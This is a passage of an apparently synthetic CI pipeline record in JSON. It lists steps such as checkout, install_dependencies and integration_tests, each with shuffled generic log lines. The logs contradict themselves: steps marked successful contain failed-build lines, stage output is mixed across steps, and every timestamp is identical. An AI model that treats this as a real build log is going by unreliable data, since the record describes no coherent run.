          "  PASS: test_api_health (6ms)",
          "  PASS: test_db_connect (319ms)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-9018",
          "  PASS: test_auth_login (458ms)",
          "Compiling src/main.py...",
          "Compiling src/utils.go...",
          "[12:00:34] ERROR: Connection failed",
          "Compiling src/service.java...",
          "  PASS: test_api_health (108ms)",
          "Installing lodash@3.17.0",
          "Compiling src/app.ts...",
          "Cache hit for key-1019",
          "Cache hit for key-8728",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (7MB)",
          "  PASS: test_db_connect (447ms)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Step 4/10: Building",
          "Installing lodash@5.15.0",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache hit for key-4070",
          "Cache hit for key-1910",
          "\u2713 test completed",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:00:34] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (352ms)",
          "Exception: NullPointerException",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Cache hit for key-9539",
          "Step 4/10: Building",
          "[12:00:34] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (210ms)",
          "Installing eslint@5.15.0",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Installing axios@2.4.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Compiling src/utils.go...",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-03T12:01:57.260229",
        "finished_at": "2025-12-03T12:02:10.577572",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Cache hit for key-3849",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Installing axios@4.7.0",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_cache_hit (376ms)",
          "Installing webpack@3.0.0",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (161ms)",
          "Compiling src/handler.rs...",
          "Compiling src/service.java...",
          "Exception: TypeError",
          "Artifact uploaded: build.tar.gz (14MB)",
          "  PASS: test_api_health (475ms)",
          "Step 4/10: Building",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] ERROR: Connection failed",
          "Installing eslint@2.9.0",
          "  PASS: test_cache_hit (280ms)",
          "\u2713 lint completed",
          "Installing lodash@5.16.0",
          "Step 6/10: Building",
          "[12:00:34] INFO: Processing request",
          "Installing webpack@5.7.0",
          "Compiling src/service.java...",
          "Installing axios@3.5.0",
          "Cache hit for key-3348",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "Installing axios@4.20.0",
          "  PASS: test_cache_hit (398ms)",
          "Installing react@4.5.0",
          "Cache hit for key-1081",
          "Compiling src/index.js...",
          "[12:00:34] WARN: Deprecated API usage",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_api_health (270ms)",
          "Cache hit for key-3270",
          "Installing jest@4.18.0",
          "Artifact uploaded: build.tar.gz (8MB)",
          "  PASS: test_user_create (77ms)",
          "\u2713 test completed",
          "  PASS: test_db_connect (69ms)",
          "Step 5/10: Building",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 119",
          "\u2713 test completed",
          "\u2713 build completed",
          "WARNING: axios has known vulnerabilities",
          "Step 1/10: Building",
          "Exception: RuntimeError",
          "  PASS: test_user_create (467ms)",
          "\u2713 lint completed",
          "Cache hit for key-3574",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_db_connect (111ms)",
          "  PASS: test_api_health (260ms)",
          "Cache hit for key-9150",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Compiling src/utils.go...",
          "Cache hit for key-4709",
          "  PASS: test_cache_hit (340ms)",
          "  PASS: test_cache_hit (395ms)",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "Compiling src/index.js...",
          "Compiling src/service.java...",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "Cache hit for key-1628",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-9358",
          "\u2717 build failed with exit code 66",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-9916",
          "Installing eslint@4.8.0",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Compiling src/index.js...",
          "Exception: NullPointerException",
          "FAILED: test_cache_hit",
          "Artifact uploaded: build.tar.gz (25MB)",
          "  PASS: test_user_create (435ms)",
          "[12:00:34] INFO: Processing request",
          "Installing react@3.16.0",
          "  PASS: test_cache_hit (195ms)",
          "Installing eslint@4.3.0",
          "Cache hit for key-8049",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "Compiling src/utils.go...",
          "Cache hit for key-2677",
          "Exception: RuntimeError",
          "  PASS: test_cache_hit (140ms)",
          "Installing react@2.12.0",
          "Cache hit for key-8418",
          "  PASS: test_cache_hit (355ms)",
          "[12:00:34] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "[12:00:34] INFO: Processing request",
          "Installing express@1.14.0",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Compiling src/handler.rs...",
          "Cache hit for key-5920",
          "Installing webpack@1.14.0",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-1764",
          "Cache hit for key-3842",
          "Cache hit for key-6488",
          "Exception: TypeError",
          "[12:00:34] ERROR: Connection failed",
          "Installing express@2.5.0",
          "Step 5/10: Building",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_auth_login (217ms)",
          "Cache hit for key-5455",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Compiling src/index.js...",
          "Cache hit for key-7403",
          "FAILED: test_user_create",
          "  PASS: test_cache_hit (440ms)",
          "Installing express@1.1.0",
          "\u2713 lint completed",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Cache hit for key-1669",
          "Installing express@3.6.0",
          "Installing eslint@3.0.0",
          "[12:00:34] INFO: Processing request",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Compiling src/main.py...",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (478ms)",
          "Cache hit for key-5920",
          "Compiling src/app.ts...",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "Installing lodash@2.19.0",
          "Compiling src/main.py...",
          "\u2717 build failed with exit code 60",
          "Cache hit for key-2742",
          "\u2713 test completed",
          "Step 4/10: Building",
          "Compiling src/service.java...",
          "Installing prettier@1.12.0",
          "Step 5/10: Building",
          "Cache hit for key-4509",
          "[12:00:34] INFO: Processing request",
          "Step 1/10: Building",
          "Installing prettier@1.17.0",
          "  PASS: test_cache_hit (262ms)",
          "  PASS: test_db_connect (448ms)",
          "WARNING: react has known vulnerabilities",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (22MB)",
          "  PASS: test_api_health (461ms)",
          "  PASS: test_api_health (154ms)",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "Step 3/10: Building",
          "[12:00:34] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_user_create (367ms)",
          "Cache hit for key-4223",
          "Step 4/10: Building",
          "[12:00:34] INFO: Processing request",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (250ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-8357",
          "Installing axios@1.19.0",
          "[12:00:34] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "Cache hit for key-6533",
          "Cache hit for key-3960",
          "[12:00:34] INFO: Processing request",
          "Installing lodash@1.6.0",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_cache_hit (257ms)",
          "Step 3/10: Building",
          "[12:00:34] INFO: Processing request",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (12MB)",
          "\u2717 build failed with exit code 109",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "WARNING: prettier has known vulnerabilities",
          "Cache hit for key-5686",
          "Compiling src/app.ts...",
          "Compiling src/handler.rs...",
          "Cache hit for key-3154",
          "\u2713 build completed",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Cache hit for key-7251",
          "Cache hit for key-9839",
          "Compiling src/handler.rs...",
          "Compiling src/index.js...",
          "Compiling src/service.java...",
          "Compiling src/app.ts...",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2713 build completed",
          "Step 1/10: Building",
          "Compiling src/app.ts...",
          "Installing react@1.13.0",
          "Step 9/10: Building",
          "Installing eslint@4.6.0",
          "[12:00:34] INFO: Processing request",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-03T12:02:10.577572",
        "finished_at": "2025-12-03T12:02:37.212257",
        "log_lines": [
          "=== Step: integration_tests ===",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "Step 5/10: Building",
          "Cache hit for key-3033",
          "Compiling src/handler.rs...",
          "Compiling src/index.js...",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Step 6/10: Building",
          "Compiling src/service.java...",
          "Compiling src/index.js...",
          "[12:00:34] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Compiling src/utils.go...",
          "Cache hit for key-7385",
          "\u2717 build failed with exit code 27",
          "Artifact uploaded: build.tar.gz (8MB)",
          "  PASS: test_cache_hit (293ms)",
          "Compiling src/main.py...",
          "Step 8/10: Building",
          "Cache hit for key-3271",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-5101",
          "Installing axios@1.14.0",
          "Compiling src/index.js...",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_db_connect (120ms)",
          "Cache hit for key-5263",
          "Artifact uploaded: build.tar.gz (47MB)",
          "  PASS: test_auth_login (264ms)",
          "Installing lodash@2.3.0",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_cache_hit (485ms)",
          "[12:00:34] INFO: Processing request",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (31MB)",
          "WARNING: webpack has known vulnerabilities",
          "Cache hit for key-9220",
          "Artifact uploaded: build.tar.gz (8MB)",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_api_health (299ms)",
          "Cache hit for key-2669",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Step 7/10: Building",
          "Cache hit for key-9379",
          "Compiling src/index.js...",
          "WARNING: axios has known vulnerabilities",
          "Installing axios@4.12.0",
          "Compiling src/index.js...",
          "Installing lodash@3.6.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/service.java...",
          "Step 4/10: Building",
          "Installing react@4.7.0",
          "  PASS: test_auth_login (148ms)",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (20MB)",
          "  PASS: test_api_health (16ms)",
          "Compiling src/index.js...",
          "Cache hit for key-3023",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "Installing eslint@2.12.0",
          "Installing webpack@2.10.0",
          "Artifact uploaded: build.tar.gz (21MB)",
          "  PASS: test_db_connect (381ms)",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Step 3/10: Building",
          "Step 10/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/app.ts...",
          "Exception: NullPointerException",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Step 2/10: Building",
          "Compiling src/index.js...",
          "  PASS: test_api_health (351ms)",
          "  PASS: test_api_health (336ms)",
          "\u2713 build completed",
          "[12:00:34] ERROR: Connection failed",
          "Cache hit for key-3740",
          "  PASS: test_db_connect (369ms)",
          "Installing lodash@4.15.0",
          "Installing axios@2.19.0",
          "Compiling src/main.py...",
          "Compiling src/index.js...",
          "Step 7/10: Building",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "Installing express@1.14.0",
          "Cache hit for key-8969",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (14MB)",
          "  PASS: test_cache_hit (404ms)",
          "[12:00:34] INFO: Processing request",
          "Step 3/10: Building",
          "Step 10/10: Building",
          "  PASS: test_api_health (37ms)",
          "[12:00:34] INFO: Processing request",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-8037",
          "Compiling src/utils.go...",
          "Step 3/10: Building",
          "Cache hit for key-7939",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Cache hit for key-1567",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (339ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing prettier@3.0.0",
          "Compiling src/main.py...",
          "Cache hit for key-2308",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "[12:00:34] INFO: Processing request",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (470ms)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Installing eslint@4.3.0",
          "  PASS: test_db_connect (64ms)",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-7798",
          "\u2713 test completed",
          "Installing react@1.5.0",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Compiling src/index.js...",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-8392",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-7020",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Installing axios@3.7.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Exception: RuntimeError",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:00:34] INFO: Processing request",
          "Compiling src/utils.go...",
          "Installing eslint@3.3.0",
          "Step 7/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_cache_hit (331ms)",
          "[12:00:34] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "\u2717 build failed with exit code 71",
          "Cache hit for key-3988",
          "  PASS: test_user_create (182ms)",
          "  PASS: test_cache_hit (443ms)",
          "[12:00:34] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_db_connect (121ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/index.js...",
          "  PASS: test_auth_login (371ms)",
          "  PASS: test_user_create (356ms)",
          "[12:00:34] ERROR: Connection failed",
          "  PASS: test_api_health (340ms)",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (40MB)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-3615",
          "Cache hit for key-9920",
          "Step 9/10: Building",
          "Installing lodash@5.0.0",
          "Installing prettier@5.4.0",
          "  PASS: test_user_create (26ms)",
          "Compiling src/index.js...",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-4568",
          "Artifact uploaded: build.tar.gz (31MB)",
          "  PASS: test_cache_hit (6ms)",
          "\u2713 test completed",
          "Step 3/10: Building",
          "Step 3/10: Building",
          "Installing prettier@2.3.0",
          "Cache hit for key-2918",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Cache hit for key-3521",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-2737",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-03T12:02:37.212257",
        "finished_at": "2025-12-03T12:02:42.539194",
        "log_lines": [
          "=== Step: checkout ===",
          "Cache hit for key-9236",
          "Cache hit for key-7110",
          "Installing webpack@3.10.0",
          "\u2713 test completed",
          "Installing prettier@5.1.0",
          "Cache hit for key-6283",
          "  PASS: test_user_create (253ms)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Installing axios@5.9.0",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Installing lodash@5.6.0",
          "\u2713 build completed",
          "  PASS: test_cache_hit (323ms)",
          "Step 4/10: Building",
          "Compiling src/utils.go...",
          "Step 9/10: Building",
          "  PASS: test_auth_login (161ms)",
          "Cache hit for key-7456",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Exception: NullPointerException",
          "Cache hit for key-3933",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Cache hit for key-6671",
          "  PASS: test_db_connect (33ms)",
          "Cache hit for key-3190",
          "Compiling src/index.js...",
          "Installing axios@3.18.0",
          "[12:00:34] WARN: Deprecated API usage",
          "  PASS: test_db_connect (464ms)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-5621",
          "  PASS: test_cache_hit (12ms)",
          "\u2713 build completed",
          "Step 7/10: Building",
          "Cache hit for key-6214",
          "Artifact uploaded: build.tar.gz (42MB)",
          "  PASS: test_user_create (100ms)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "[12:00:34] INFO: Processing request",
          "Compiling src/app.ts...",
          "Cache hit for key-2059",
          "\u2713 test completed",
          "Exception: TypeError",
          "Compiling src/service.java...",
          "Step 3/10: Building",
          "Compiling src/service.java...",
          "Cache hit for key-7143",
          "Installing webpack@2.4.0",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (203ms)",
          "Exception: ValueError",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Cache hit for key-7579",
          "Artifact uploaded: build.tar.gz (28MB)",
          "  PASS: test_cache_hit (233ms)",
          "[12:00:34] INFO: Processing request",
          "Step 3/10: Building",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "Step 8/10: Building",
          "Cache hit for key-4570",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Cache hit for key-8611",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "  PASS: test_cache_hit (128ms)",
          "Cache hit for key-4281",
          "Cache hit for key-8090",
          "Installing react@2.18.0",
          "Compiling src/utils.go...",
          "[12:00:34] INFO: Processing request",
          "Step 6/10: Building",
          "Installing jest@3.14.0",
          "[12:00:34] INFO: Processing request",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (65ms)",
          "Installing axios@5.2.0",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Installing webpack@2.2.0",
          "Artifact uploaded: build.tar.gz (40MB)",
          "  PASS: test_user_create (428ms)",
          "  PASS: test_api_health (17ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Cache hit for key-5089",
          "  PASS: test_api_health (136ms)",
          "Step 1/10: Building",
          "Installing express@1.3.0",
          "\u2713 lint completed",
          "  PASS: test_auth_login (392ms)",
          "Installing react@5.20.0",
          "Cache hit for key-9449",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-2567",
          "[12:00:34] ERROR: Connection failed",
          "Cache hit for key-4884",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 lint completed",
          "Step 7/10: Building",
          "[12:00:34] INFO: Processing request",
          "Installing lodash@5.15.0",
          "\u2713 lint completed",
          "Cache hit for key-7792",
          "[12:00:34] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (250ms)",
          "Cache hit for key-7055",
          "Installing axios@1.5.0",
          "Cache hit for key-9472",
          "Step 7/10: Building",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "FAILED: test_db_connect",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (23MB)",
          "\u2713 build completed",
          "Cache hit for key-4465",
          "Installing express@3.17.0",
          "Installing react@2.13.0",
          "Step 6/10: Building",
          "[12:00:34] INFO: Processing request",
          "Compiling src/utils.go...",
          "Installing axios@4.3.0",
          "Step 4/10: Building",
          "Installing prettier@3.20.0",
          "Cache hit for key-6778",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Installing webpack@1.0.0",
          "\u2717 build failed with exit code 80",
          "  PASS: test_auth_login (414ms)",
          "Step 6/10: Building",
          "[12:00:34] INFO: Processing request",
          "Step 9/10: Building",
          "  PASS: test_db_connect (131ms)",
          "\u2713 lint completed",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Installing prettier@4.7.0",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Installing eslint@4.17.0",
          "Step 10/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing jest@5.6.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: axios has known vulnerabilities",
          "Installing webpack@4.20.0",
          "Step 5/10: Building",
          "Cache hit for key-8076",
          "Step 9/10: Building",
          "  PASS: test_user_create (138ms)",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Compiling src/main.py...",
          "Step 8/10: Building",
          "Compiling src/service.java...",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Cache hit for key-5139",
          "Artifact uploaded: build.tar.gz (13MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 test completed",
          "Installing express@5.0.0",
          "Installing jest@4.3.0",
          "  PASS: test_db_connect (3ms)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Step 6/10: Building",
          "Cache hit for key-4006",
          "[12:00:34] WARN: Deprecated API usage",
          "Step 9/10: Building",
          "Installing axios@1.8.0",
          "[12:00:34] INFO: Processing request",
          "Exception: NullPointerException",
          "Step 7/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-4863",
          "Compiling src/index.js...",
          "Installing prettier@2.10.0",
          "Step 7/10: Building",
          "  PASS: test_cache_hit (72ms)",
          "[12:00:34] INFO: Processing request",
          "Installing lodash@3.8.0",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Installing axios@4.11.0",
          "Installing jest@5.13.0",
          "  PASS: test_api_health (64ms)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "WARNING: lodash has known vulnerabilities",
          "Installing eslint@2.14.0",
          "  PASS: test_cache_hit (333ms)",
          "Step 2/10: Building",
          "Installing express@1.15.0",
          "\u2713 build completed",
          "Cache hit for key-1508",
          "  PASS: test_auth_login (259ms)",
          "Cache hit for key-1276",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_api_health (119ms)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "Compiling src/main.py...",
          "Step 3/10: Building",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-03T12:02:42.539194",
        "finished_at": "2025-12-03T12:03:22.491222",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] WARN: Deprecated API usage",
          "Installing eslint@4.16.0",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: test_db_connect (359ms)",
          "Installing express@1.16.0",
          "\u2713 test completed",
          "Installing lodash@5.7.0",
          "Artifact uploaded: build.tar.gz (32MB)",
          "  PASS: test_user_create (25ms)",
          "Cache hit for key-1638",
          "\u2713 build completed",
          "Step 2/10: Building",
          "  PASS: test_user_create (339ms)",
          "Compiling src/main.py...",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-4134",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Step 3/10: Building",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_api_health (384ms)",
          "Cache hit for key-4948",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_db_connect (453ms)",
          "  PASS: test_cache_hit (93ms)",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "[12:00:34] WARN: Deprecated API usage",
          "Cache hit for key-7371",
          "Step 9/10: Building",
          "Compiling src/main.py...",
          "[12:00:34] INFO: Processing request",
          "Step 8/10: Building",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Step 8/10: Building",
          "[12:00:34] INFO: Processing request",
          "Step 3/10: Building",
          "Installing eslint@5.17.0",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_user_create (93ms)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Cache hit for key-7555",
          "Step 5/10: Building",
          "  PASS: test_api_health (314ms)",
          "[12:00:34] INFO: Processing request",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (201ms)",
          "Cache hit for key-1368",
          "Installing axios@1.4.0",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-7903",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-8908",
          "Installing jest@5.11.0",
          "\u2713 build completed",
          "  PASS: test_db_connect (326ms)",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (181ms)",
          "  PASS: test_api_health (194ms)",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 test completed",
          "  PASS: test_user_create (170ms)",
          "Compiling src/index.js...",
          "Cache hit for key-8366",
          "Artifact uploaded: build.tar.gz (20MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Cache hit for key-1173",
          "  PASS: test_api_health (229ms)",
          "[12:00:34] WARN: Deprecated API usage",
          "Cache hit for key-1118",
          "Step 9/10: Building",
          "Installing jest@2.5.0",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-6452",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (8ms)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (46MB)",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (41MB)",
          "  PASS: test_api_health (292ms)",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "Installing axios@4.0.0",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (31MB)",
          "  PASS: test_auth_login (214ms)",
          "Installing react@5.1.0",
          "Cache hit for key-4150",
          "Compiling src/utils.go...",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (26MB)",
          "  PASS: test_db_connect (440ms)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Installing webpack@3.19.0",
          "\u2713 build completed",
